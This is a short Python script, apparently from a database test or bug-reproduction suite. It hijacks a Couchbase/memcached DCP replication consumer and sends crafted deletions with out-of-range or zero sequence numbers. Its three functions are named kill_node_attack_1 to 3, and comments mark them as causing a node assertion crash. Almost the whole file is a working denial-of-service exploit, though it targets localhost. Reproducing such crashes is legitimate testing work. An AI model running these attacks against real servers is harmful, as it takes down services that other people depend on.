
import pprint
import time

from lib.dcp_bin_client import DcpClient
from lib.mc_bin_client import MemcachedClient as McdClient
from constants import *

def get_dcp_stuff(host, port):
    mcd_client = McdClient(host, port)
    dcp = mcd_client.stats('dcp')

    # Find a VB consumer and seqno
    for key in dcp:
        keyList = key.split("_")
        if keyList[-1] == "state":
            if dcp[key] == "reading":

                # Get the seqno
                seqList=keyList
                seqList[-1] = "last_received_seqno"
                seqKey = "_".join(seqList)

                # Get the seqno
                end_seqno = int(dcp[seqKey])

                # Get the VB
                vbid = int(key.split("_")[-2])

                # Mangle out the conn string
                conn = key.replace("eq_dcpq:", "")
                consumer_ID = conn.replace(":stream_"+str(vbid)+"_state", "")
                break

    return (consumer_ID, vbid, end_seqno)

def kill_node_attack_3(host, port):
    upr_client = DcpClient(host, port)
    consumer_ID, vbid, end_seqno = get_dcp_stuff(host, port)
    print "Will connect to {} for VB {} and seq_no {}".format(consumer_ID, vbid, end_seqno)

    print "Opening DCP consumer {}".format(consumer_ID)
    op = upr_client.open_consumer(consumer_ID)

    print "VB {} and seqno {}".format(vbid, end_seqno)
    op = upr_client.add_stream(vbid, 0)
    print "Sending snapshot marker"
    op = upr_client.snapshot_marker(vbid, 0, end_seqno-2)
    print "Sending deletion with out of range seqno"
    op = upr_client.send_deletion(vbid, "keyme", end_seqno+1)
    print "Sending stream close"
    op = upr_client.close_stream(vbid)


def kill_node_attack_2(host, port):
    upr_client = DcpClient(host, port)
    consumer_ID, vbid, end_seqno = get_dcp_stuff(host, port)
    print "Will connect to {} for VB {} and seq_no {}".format(consumer_ID, vbid, end_seqno)

    print "Opening DCP consumer {}".format(consumer_ID)
    op = upr_client.open_consumer(consumer_ID)

    print "VB {} and seqno {}".format(vbid, end_seqno)
    op = upr_client.add_stream(vbid, 0)

    print "Sending deletion with out of range seqno"
    op = upr_client.send_deletion(vbid, "keyme", end_seqno+1) # node assert
    print "Sending stream close"
    op = upr_client.close_stream(vbid)

def kill_node_attack_1(host, port):
    upr_client = DcpClient(host, port)
    consumer_ID, vbid, end_seqno = get_dcp_stuff(host, port)
    print "Will connect to {} for VB {} and seq_no {}".format(consumer_ID, vbid, end_seqno)

    print "Opening DCP consumer {}".format(consumer_ID)
    op = upr_client.open_consumer(consumer_ID)

    print "VB {} and seqno {}".format(vbid, end_seqno)
    op = upr_client.add_stream(vbid, 0)

    print "Sending deletion with 0 seqno"
    op = upr_client.send_deletion(vbid, "keyme", 0) # node assert

    print "Sending stream close"
    op = upr_client.close_stream(vbid)

if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 12000
    kill_node_attack_2(ip, port)
